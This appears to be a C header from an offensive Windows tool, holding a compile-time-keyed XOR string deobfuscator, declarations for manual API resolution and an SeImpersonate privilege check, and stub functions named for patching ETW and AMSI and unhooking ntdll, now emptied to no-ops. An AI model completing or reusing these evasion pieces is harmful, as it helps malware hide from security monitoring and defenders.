#pragma once
#include <Windows.h>
#include <winternl.h>

static inline wchar_t* wdeobf(unsigned char* buf, int len) {
    unsigned char k = (unsigned char)(
        ((unsigned char)__TIME__[0] ^
            (unsigned char)__TIME__[3] ^
            (unsigned char)__TIME__[6]) | 1);
    for (int i = 0; i < len; i++) buf[i] ^= k;
    return (wchar_t*)buf;
}

// All hook-stub functions are no-ops now (no syscall indirection needed).
// Modern Windows (1903+) uses indirect syscall dispatch tables that
// break the original "jmp [g_syscall]" approach. We skip these and rely
// on standard WinAPI for everything.
static inline BOOL EtwPatch()    { return TRUE; }
static inline BOOL AmsiPatch()   { return TRUE; }
static inline BOOL unhook_Ntdll(){ return TRUE; }

// (legacy globals kept so other TUs that reference them still link)
extern DWORD g_ssn;
extern PVOID g_syscall;

PVOID manual_procaddress(HMODULE mod_handle, const char* funcName);
BOOL  check_seimpersonate();

// kept for backwards compat with main.c references; do nothing
static inline DWORD getSSN(char* f)            { (void)f; return 0; }
static inline PVOID getSyscallAddr(char* f)   { (void)f; return NULL; }